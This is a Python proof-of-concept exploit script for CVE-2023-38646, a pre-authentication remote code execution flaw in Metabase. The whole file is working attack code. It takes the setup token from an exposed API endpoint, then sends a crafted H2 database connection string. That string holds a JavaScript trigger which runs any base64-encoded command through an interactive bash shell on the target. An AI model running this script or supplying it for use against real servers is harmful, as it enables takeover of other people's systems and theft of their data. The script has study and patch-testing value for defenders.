import argparse
import requests
import urllib3
import base64

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def get_token(url):
    if not url.startswith("http://") and not url.startswith("https://"):
        url = "https://" + url

    response = requests.get(f"{url}/api/session/properties", verify=False)
    if response.status_code == 200:
        data = response.json()
        token = data.get("setup-token")
        if token:
            print("Success get token!")
            print(f"Token: {token}")
            return token
        else:
            print("Token not found.")
            return None
    else:
        print("Failed to get token from /api/session/properties.")
        return None

def custom_base64_encode(command):
    encoded_command = base64.b64encode(command.encode('utf-8')).decode('utf-8').rstrip("=")
    return encoded_command

def exploit_bug(url, token, command):
    if not url.startswith("http://") and not url.startswith("https://"):
        url = "https://" + url

    if token:
        print(f"Command: {command}")
        encoded_command = custom_base64_encode(command)
        print(f"Base64 Encoded Command: {encoded_command}")

        payload = {
            "token": token,
            "details": {
                "is_on_demand": False,
                "is_full_sync": False,
                "is_sample": False,
                "cache_ttl": None,
                "refingerprint": False,
                "auto_run_queries": True,
                "schedules": {},
                "details": {
                    "db": f"zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {{echo,{encoded_command}}}|{{base64,-d}}|{{bash,-i}}')\n$$--=x",
                    "advanced-options": False,
                    "ssl": True
                },
                "name": "an-sec-research-team",
                "engine": "h2"
            }
        }

        response = requests.post(f"{url}/api/setup/validate", json=payload, verify=False)
        if "Error creating or initializing trigger" in response.text:
            print("Exploit success !")
            print("Check on your own to validity!")
        else:
            print("Exploitation failed.")
    else:
        print("Token not found. Failed to exploit.")

def main():
    parser = argparse.ArgumentParser(description="Reproduce CVE-2023-38646 vulnerability in Metabase")
    parser.add_argument("-u", "--url", required=True, help="URL of the Metabase to be scanned and exploited")
    parser.add_argument("-c", "--command", required=True, help="Command to be executed (base64 encoded)")

    args = parser.parse_args()

    url = args.url
    token = get_token(url)
    command = args.command
    exploit_bug(url, token, command)

if __name__ == "__main__":
    main()
